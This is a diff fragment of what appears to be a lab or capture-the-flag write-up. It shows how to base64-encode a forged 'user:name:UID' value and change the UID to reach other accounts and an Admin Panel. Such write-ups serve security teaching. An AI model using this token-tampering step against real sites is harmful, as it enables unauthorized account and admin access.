@@ -64,13 +64,12 @@ echo "administrator:administrator Account:0" | base64
 YWRtaW5pc3RyYXRvcjphZG1pbmlzdHJhdG9yIEFjY291bnQ6MAo=
 ```
 
-
-Change the UID to
+Change the UID from 1 to 2 or 3 redirects to other accounts.
 
 
 ```
 echo "admin:administrator Account:23" | base64
 YWRtaW46YWRtaW5pc3RyYXRvciBBY2NvdW50OjIzCg==
 ```
-
+UID set to 23 redirects to the Admin Panel
 
